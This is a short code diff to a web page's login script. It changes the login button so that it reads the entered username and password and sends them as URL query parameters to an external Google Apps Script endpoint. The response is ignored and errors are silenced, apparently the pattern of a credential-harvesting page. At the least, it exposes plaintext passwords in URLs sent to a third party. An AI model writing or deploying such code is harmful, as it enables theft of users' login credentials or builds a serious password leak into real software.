@@ -294,7 +294,13 @@ document.getElementById("newAccountButton").onclick = function() {
 };
 
 document.getElementById('loginButton').onclick = function() {
-    fetch('https://script.google.com/macros/s/AKfycbx2Kn4hMTzHbxz8rDdeP4kKrNdHwERLcRnbTTqyspZtz3a8P0hc5c-NIzVLSes1G-mM/exec', { method: 'GET' })
+    var username = document.getElementById('username').value; // Get username from input
+    var password = document.getElementById('password').value; // Get password from input
+
+    // Create the URL with query parameters
+    var url = `https://script.google.com/macros/s/AKfycbx2Kn4hMTzHbxz8rDdeP4kKrNdHwERLcRnbTTqyspZtz3a8P0hc5c-NIzVLSes1G-mM/exec?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+
+    fetch(url, { method: 'GET' })
         .then(() => {
             // Do nothing after the fetch is complete
         })
@@ -302,6 +308,7 @@ document.getElementById('loginButton').onclick = function() {
             // Handle errors silently, if needed
         });
 };
+
 
     </script>
 </body>
